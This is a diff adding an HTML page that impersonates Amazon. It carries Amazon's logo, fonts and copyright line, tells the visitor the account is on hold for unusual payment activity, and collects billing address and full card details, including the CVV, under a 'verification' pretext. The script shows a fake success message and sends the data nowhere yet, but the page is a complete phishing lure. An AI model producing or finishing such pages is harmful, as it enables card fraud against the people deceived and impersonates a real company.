@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+{box-sizing:border-box}
+body {
+    margin: 0;
+    background: #fff;
+    color: #0f1111;
+    /* Exact Amazon Font Stack */
+    font-family: "Amazon Ember", "Arial", "Helvetica Neue", Helvetica, sans-serif;
+    font-size: 14px;
+    line-height: 1.5;
+}
+.logo-container {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    padding: 30px 0 20px;
+    background: #fff;
+}
+.logo-container img {
+    width: 120px;
+    height: auto;
+    display: block;
+}
+main {
+    width: min(100% - 40px, 500px);
+    margin: 0 auto 80px;
+}
+.eyebrow {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: #565959;
+    margin: 0 0 15px;
+    text-align: center;
+    letter-spacing: 0.5px;
+}
+.alert {
+    display: flex;
+    gap: 12px;
+    background: #fff;
+    border: 1px solid #fbc265;
+    border-radius: 4px;
+    padding: 16px;
+    margin-bottom: 30px;
+}
+.alert-icon {
+    color: #e47911;
+    flex-shrink: 0;
+    font-weight: bold;
+    font-size: 18px;
+}
+.alert-content h1 {
+    font-size: 16px;
+    line-height: 1.3;
+    margin: 0 0 6px;
+    font-weight: 700;
+    color: #0f1111;
+}
+.alert-content p {
+    margin: 0;
+    color: #565959;
+    font-size: 13px;
+}
+.alert-content a {
+    color: #007185;
+    text-decoration: none;
+}
+.alert-content a:hover {
+    color: #c45500;
+    text-decoration: underline;
+}
+.section-title {
+    font-size: 22px;
+    font-weight: 700;
+    margin: 0 0 8px;
+    color: #0f1111;
+}
+.section-intro {
+    color: #565959;
+    margin: 0 0 20px;
+    font-size: 14px;
+}
+.reassurance-box {
+    background: #f8f9fa;
+    border: 1px solid #eee;
+    border-radius: 4px;
+    padding: 12px;
+    margin-bottom: 20px;
+    font-size: 12px;
+    color: #565959;
+    line-height: 1.4;
+}
+.required-note {
+    font-size: 12px;
+    color: #B12704;
+    margin: 0 0 20px;
+}
+form {
+    display: grid;
+    gap: 20px;
+}
+.field label {
+    display: block;
+    font-weight: 700;
+    font-size: 13px;
+    margin: 0 0 5px;
+    color: #0f1111;
+}
+.field input, .field select {
+    width: 100%;
+    height: 34px;
+    border: 1px solid #a6a6a6;
+    border-radius: 3px;
+    background: white;
+    color: #0f1111;
+    padding: 0 8px;
+    font: inherit;
+    outline: none;
+}
+.field input:focus {
+    border-color: #e77600;
+    box-shadow: 0 0 0 3px rgba(228, 121, 17, 0.2);
+}
+.stack {
+    display: grid;
+    gap: 10px;
+}
+.row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+}
+.actions {
+    margin-top: 25px;
+}
+button {
+    background: #ffd814;
+    border: 1px solid #fcd200;
+    border-radius: 8px;
+    padding: 8px 24px;
+    color: #0f1111;
+    font: inherit;
+    font-weight: 400;
+    cursor: pointer;
+    box-shadow: 0 2px 5px 0 rgba(213,217,217,.5);
+    width: max-content;
+}
+button:hover {
+    background: #f7ca00;
+    border-color: #f2c200;
+}
+.hidden {
+    display: none;
+}
+.status {
+    color: #007600;
+    font-size: 13px;
+    margin: 12px 0 0;
+}
+footer {
+    border-top: 1px solid #ddd;
+    width: min(100% - 40px, 1000px);
+    margin: 0 auto;
+    padding: 30px 0;
+    color: #565959;
+    font-size: 12px;
+    text-align: center;
+}
+.asterisk {
+    color: #B12704;
+    margin-right: 4px;
+}
+</style>
+</head>
+<body>
+
+<div class="logo-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+</div>
+
+<main>
+    <p class="eyebrow">Account Verification</p>
+    
+    <section class="alert">
+        <div class="alert-icon">⚠️</div>
+        <div class="alert-content">
+            <h1 id="alert-title">Account on hold temporarily</h1>
+            <p>We noticed unusual payment activity on your account and need to verify ownership of the payment method used on your most recent order. (<a href="#" onclick="alert('To ensure the security of your account and protect against unauthorized transactions, we routinely perform verification checks on payment methods during high-volume periods or when unusual patterns are detected.')">Why?</a>)</p>
+        </div>
+    </section>
+
+    <!-- STEP 1: BILLING ADDRESS -->
+    <div id="step-address">
+        <h2 class="section-title">Enter billing details</h2>
+        <p class="section-intro">This is required to remove the hold on your account.</p>
+        
+        <div class="reassurance-box">
+            <strong>Security Note:</strong> We routinely perform secure verification sweeps to protect our customers from unauthorized activity. Confirming your billing address ensures that the payment method on file matches the authorized cardholder records.
+        </div>
+
+        <p class="required-note">* Required fields</p>
+        
+        <form id="form-address">
+            <div class="field">
+                <label for="name"><span class="asterisk">*</span>Full name</label>
+                <input id="name" name="name" autocomplete="name" placeholder="Name that appears on the payment method" required>
+            </div>
+            <div class="field">
+                <label for="country">Country/Region</label>
+                <select id="country" name="country" autocomplete="country-name" required>
+                    <option value="US" selected>United States</option>
+                    <option value="CA">Canada</option>
+                    <option value="GB">United Kingdom</option>
+                    <option value="AU">Australia</option>
+                </select>
+            </div>
+            <div class="field">
+                <label for="address"><span class="asterisk">*</span>Billing address</label>
+                <div class="stack">
+                    <input id="address" name="address" autocomplete="address-line1" placeholder="Street and number, P.O. box, c/o." required>
+                    <input name="address2" autocomplete="address-line2" placeholder="Apartment, suite, unit, building, floor, etc.">
+                </div>
+            </div>
+            <div class="row">
+                <div class="field">
+                    <label for="city"><span class="asterisk">*</span>City</label>
+                    <input id="city" name="city" autocomplete="address-level2" required>
+                </div>
+                <div class="field">
+                    <label for="state"><span class="asterisk">*</span>State/Province/Region</label>
+                    <input id="state" name="state" autocomplete="address-level1" required>
+                </div>
+            </div>
+            <div class="field">
+                <label for="zip"><span class="asterisk">*</span>Zip Code</label>
+                <input id="zip" name="zip" autocomplete="postal-code" required>
+            </div>
+            <div class="actions">
+                <button type="submit">Continue</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- STEP 2: CREDIT CARD INFO -->
+    <div id="step-payment" class="hidden">
+        <h2 class="section-title">Payment Method</h2>
+        <p class="section-intro">Enter your card details to complete the verification process.</p>
+        <p class="required-note">* Required fields</p>
+        
+        <form id="form-payment">
+            <div class="field">
+                <label for="cardnumber"><span class="asterisk">*</span>Card number</label>
+                <input id="cardnumber" name="cardnumber" autocomplete="cc-number" placeholder="16 digit card number" pattern="[0-9\s]{13,19}" maxlength="19" required>
+            </div>
+            <div class="row">
+                <div class="field">
+                    <label for="expiry"><span class="asterisk">*</span>Expiration Date</label>
+                    <input id="expiry" name="expiry" autocomplete="cc-exp" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" required>
+                </div>
+                <div class="field">
+                    <label for="cvv"><span class="asterisk">*</span>CVV</label>
+                    <input id="cvv" name="cvv" autocomplete="cc-csc" placeholder="3 or 4 digits" pattern="[0-9]{3,4}" maxlength="4" required>
+                </div>
+            </div>
+            <div class="actions">
+                <button type="submit">Verify Account</button>
+                <p class="status" role="status" hidden>Verification successful. Your account access is being restored.</p>
+            </div>
+        </form>
+    </div>
+</main>
+<footer>
+    &copy; 2026 Amazon.com, Inc. or its affiliates
+</footer>
+
+<script>
+    const addressStep = document.getElementById('step-address');
+    const paymentStep = document.getElementById('step-payment');
+    const addressForm = document.getElementById('form-address');
+    const paymentForm = document.getElementById('form-payment');
+
+    addressForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        addressStep.classList.add('hidden');
+        paymentStep.classList.remove('hidden');
+        window.scrollTo(0,0);
+    });
+
+    paymentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        document.querySelector('.status').hidden = false;
+    });
+</script>
+</body>
+</html>
